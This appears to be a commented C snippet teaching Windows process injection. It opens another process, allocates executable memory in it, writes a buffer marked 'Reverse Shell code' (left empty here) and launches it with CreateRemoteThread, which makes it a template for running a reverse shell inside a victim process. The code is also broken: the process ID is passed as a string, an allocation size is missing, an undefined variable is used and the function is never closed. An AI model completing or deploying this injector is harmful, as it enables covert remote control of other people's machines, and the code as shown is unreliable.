#include <stdio.h> 
#include <windows.h> // the windows.h header file contains definitions and prototypes for functions and structures that are specific to the Windows os

int main ()
{
char shellcode[] = {//Reverse Shell code 
};

HANDLE hProcess; // hProcess variable used to store a remote process that the shellcode will be injected into
HANDLE hThread; // hThread variable used to thread that is created in the remote process
void* find_memorey; // store the address of the memory address where the shellcode will be allocated and executed.
hProcess = OpenProcess(PROCESS_ALL_ACCESS, TRUE,"3789"); // the OpenProcess() function used to open a handle to the remote process , PROCESS_ALL_ACCESS which give us full access to the process and a Boolean value that if child process should inherit the handle , "3789" the process number
find_memorey = VirtualAllocEx(hProcess, NULL, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);  // this is the part find_memorey use the VirtualAllocEx() function to allocate memory in the remote proces
WriteProcessMemory(hProcess, exec_mem, shellcode, sizeof(shellcode), NULL); //The first parameter is the handle to the process, the second parameter is the base address of the memory to write to, the third parameter is the buffer containing the data to write, and the fourth parameter is the size of the data to write
hThread = CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)find_memorey, NULL, 0, 0); //first parameter is the handle to the process, the second and third parameters are thread attributes and stack size, the fourth parameter - start address of the thread, the fifth parameter - thread parameter, the sixth and seventh parameter are flags and threadid.
CloseHandle(hProcess); 
return 0;

